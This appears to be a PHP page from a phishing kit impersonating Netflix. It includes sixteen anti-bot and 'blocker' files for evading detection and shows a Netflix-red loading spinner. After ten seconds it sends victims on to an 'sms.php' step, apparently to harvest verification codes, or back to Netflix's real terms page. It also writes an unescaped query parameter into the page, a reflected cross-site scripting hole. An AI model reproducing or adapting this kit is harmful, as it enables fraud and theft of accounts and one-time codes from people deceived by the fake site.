<?php
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
 include_once "./includes/header.html" 
?>
<style>
    .loader {
        text-align: center;
        margin-top: 50px;
        margin-bottom: 100px;
    }

    .lds-spinner {
        color: official;
        display: inline-block;
        position: relative;
        width: 80px;
        height: 80px;
    }

    .lds-spinner div:after {
        content: " ";
        display: block;
        position: absolute;
        top: 3px;
        left: 37px;
        width: 6px;
        height: 18px;
        border-radius: 20%;
        background: #E50915;
    }

    .lds-spinner div:nth-child(1) {
        transform: rotate(0deg);
        animation-delay: -1.1s;
    }

    .lds-spinner div:nth-child(2) {
        transform: rotate(30deg);
        animation-delay: -1s;
    }

    .lds-spinner div:nth-child(3) {
        transform: rotate(60deg);
        animation-delay: -0.9s;
    }

    .lds-spinner div:nth-child(4) {
        transform: rotate(90deg);
        animation-delay: -0.8s;
    }

    .lds-spinner div:nth-child(5) {
        transform: rotate(120deg);
        animation-delay: -0.7s;
    }

    .lds-spinner div:nth-child(6) {
        transform: rotate(150deg);
        animation-delay: -0.6s;
    }

    .lds-spinner div:nth-child(7) {
        transform: rotate(180deg);
        animation-delay: -0.5s;
    }

    .lds-spinner div:nth-child(8) {
        transform: rotate(210deg);
        animation-delay: -0.4s;
    }

    .lds-spinner div:nth-child(9) {
        transform: rotate(240deg);
        animation-delay: -0.3s;
    }

    .lds-spinner div:nth-child(10) {
        transform: rotate(270deg);
        animation-delay: -0.2s;
    }

    .lds-spinner div:nth-child(11) {
        transform: rotate(300deg);
        animation-delay: -0.1s;
    }

    .lds-spinner div:nth-child(12) {
        transform: rotate(330deg);
        animation-delay: 0s;
    }

    .lds-spinner div {
        transform-origin: 40px 40px;
        animation: lds-spinner 1.2s linear infinite;
    }

    @keyframes lds-spinner {
        0% {
            opacity: 1;
        }

        100% {
            opacity: 0;
        }
    }
</style>
<main id="main">
    <div class="container">
        <div class="loader">
            <div class="lds-spinner">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
    </div>
</main>
<input type="hidden" id="go" value="<?php if (isset($_GET['go'])) echo $_GET['go']; ?>">

</div>

<script>
  if (document.getElementById("go").value == "sms") {
        setTimeout(function() {
            window.location.href = "sms.php";
        }, 10000); // 1000 = 1s
    }  else if (document.getElementById("go").value == "sms2") {
        setTimeout(function() {
            window.location.href = "sms.php?c=2";
        }, 10000); // 1000 = 1s
    }
    else if (document.getElementById("go").value == "net") {
        setTimeout(function() {
            window.location.href = "https://help.netflix.com/legal/termsofuse";
        }, 10000); // 1000 = 1s
    }
</script>


<?php include_once "./includes/footer.html" ?>